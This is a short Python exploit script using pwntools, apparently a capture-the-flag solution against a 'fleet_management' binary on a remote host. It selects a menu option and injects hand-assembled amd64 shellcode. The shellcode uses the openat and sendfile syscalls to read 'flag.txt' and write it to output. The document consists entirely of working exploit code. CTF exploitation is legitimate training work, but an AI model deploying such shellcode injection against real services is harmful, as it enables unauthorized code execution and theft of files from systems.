import pwn

#p = pwn.process("./fleet_management")
p = pwn.remote("134.209.22.191",31056)
p.recvuntil("to do? ")
p.sendline("9")

asm = """
    mov rax, 257
    mov rdi, -100
    xor rdx, rdx
    push rdx
    mov rbx, 0x7478742e67616c66
    push rbx
    mov rsi, rsp
    syscall
    
    mov rsi, rax
    mov rax, 40
    mov rdi, 1
    mov r10, 256
    syscall
"""
test = """
    mov rax, 0x3c
    xor rdi, rdi
    syscall
"""
shellcode = pwn.asm(asm, arch = "amd64", os = "linux")
pwn.log.info("LEN: " + str(len(shellcode)))
p.sendline(shellcode)
print(p.clean().decode('latin1'))
